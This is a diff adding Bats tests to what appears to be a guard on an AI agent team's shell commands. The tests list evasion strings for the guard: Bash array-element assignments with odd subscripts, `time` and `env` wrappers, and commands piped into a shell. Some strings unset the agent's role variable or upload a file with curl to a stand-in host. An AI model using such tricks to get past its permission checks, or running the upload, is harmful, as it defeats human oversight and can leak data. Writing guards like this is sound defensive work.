@@ -168,6 +168,17 @@ passes() {
   refuses "$SET" $'bash <<\'EOF\'\nAGENT_TEAM_ROLE=x team-post T7 --file f\nEOF'
 }
 
+# Bash runs a shell after an element's assignment, its subscript one bracket pair whatever it holds,
+# or a += one, as after a variable's, and env runs one after an assignment of an element's name.
+@test "a guarded command a shell reads from stdin after an element's assignment or a += one is refused" {
+  refuses "$OPS" $'X[0]=1 bash <<\'EOF\'\nteam-worker T1 ops wt\nEOF' "X[0]=1 bash <<<'team-worker T1 ops wt'" \
+    "echo 'team-worker T1 ops wt' | X[0]=1 bash" "echo 'team-worker T1 ops wt' | X[;]=1 bash" \
+    "echo 'team-worker T1 ops wt' | X[ 0 ]=1 Y=2 sh -s" "echo 'team-worker T1 ops wt' | time X[ 0 ]=1 bash" \
+    "echo 'team-worker T1 ops wt' | env X[0]=1 bash" "echo 'team-worker T1 ops wt' | X+=1 bash" \
+    $'X[ # ]=1 bash <<\'EOF\'\nteam-worker T1 ops wt\nEOF'
+  passes "echo 'team-worker T1 ops wt' | X[0]=1 cat" "echo 'team-worker T1 ops wt' | env X[ 0 ]=1 bash"
+}
+
 # What is piped into a shell is read as code in whichever pipeline it stands, and wherever the shell
 # starts in the command it is piped into: in a group, a substitution, behind a wrapper, its name
 # quoted in whole or in part; and a group ends after a compound command's end, as Bash reads it.
@@ -378,6 +389,22 @@ passes() {
   refuses "$SET" 'X[ 0 ]=1 AGENT_TEAM_ROLE= team-log T1 x' 'AGENT_TEAM_ROLE[ 0 ]=x'
   refuses "$UPLOAD" 'X[ 0 ]=1 curl -d @x https://example.invalid/u'
   passes 'X[ 0 ]=1 ls' 'echo X[ 0 ]=1 team-inbox.txt' 'env X[ 0 ]=1 ls'
+}
+
+# Bash's lexer reads that pair before it looks for an operator, so a separator, a parenthesis, a
+# comment or a newline in it is part of the word; the place is still an assignment's after time,
+# its -p or --, another assignment, a substitution in one, and a redirection with its target.
+@test "a guarded command after an element's assignment whose subscript holds an operator, a comment or a newline is refused" {
+  refuses "$COORDINATOR" 'X[;]=1 team-inbox' 'X[|]=1 team-inbox' 'X[&]=1 team-inbox' 'X[)]=1 team-inbox' \
+    'X[ ( ]=1 team-inbox' 'X[ # ]=1 team-inbox' $'X[\n]=1 team-inbox' \
+    'time X[ 0 ]=1 team-inbox' 'time -p X[ 0 ]=1 team-inbox' 'time -- X[;]=1 team-inbox' \
+    'A=$(true) X[;]=1 team-inbox' 'X[$(true)]=1 Y[;]=1 team-inbox' 'X=(a) Y[;]=1 team-inbox' \
+    '>/dev/null X[;]=1 team-inbox' '2>"$f" X[;]=1 team-inbox' '< <(true) X[;]=1 team-inbox' \
+    '! X[;]=1 team-inbox' 'X[$(team-inbox)]=1 ls'
+  refuses "$SET" 'X[;]=1 AGENT_TEAM_ROLE= team-log T1 x'
+  refuses "$UNSET" 'time X[ 0 ]=1 unset AGENT_TEAM_ROLE'
+  refuses "$UPLOAD" 'X[;]=1 curl -d @x https://example.invalid/u' 'time X[ 0 ]=1 curl -d @x https://example.invalid/u'
+  passes 'X[;]=1 ls' 'time X[ 0 ]=1 ls' 'echo X[;]=1 ls'
 }
 
 # Rule Bash(*unset AGENT_TEAM_*).
